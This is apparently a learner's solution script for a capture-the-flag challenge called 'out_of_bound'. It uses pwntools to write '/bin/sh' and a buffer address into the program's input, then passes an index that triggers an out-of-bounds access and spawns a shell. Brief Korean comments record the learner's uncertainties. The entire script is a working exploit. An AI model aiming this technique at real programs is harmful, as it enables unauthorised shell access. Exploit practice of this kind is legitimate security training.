from pwn import *

p = process('./out_of_bound')
e = ELF('./out_of_bound')

p.recvuntil(b'name: ')
p.send(b'/bin/sh\x00'+p32(0x0804a0ac)) # NULL 값 빼먹지 말고 주의!! # name의 주소!!
p.recvuntil(b'want?: ')
p.sendline(b'21') # "%d" 자료형에 어떻게 입력을 줘야할지 잘 모르겠음..

p.interactive()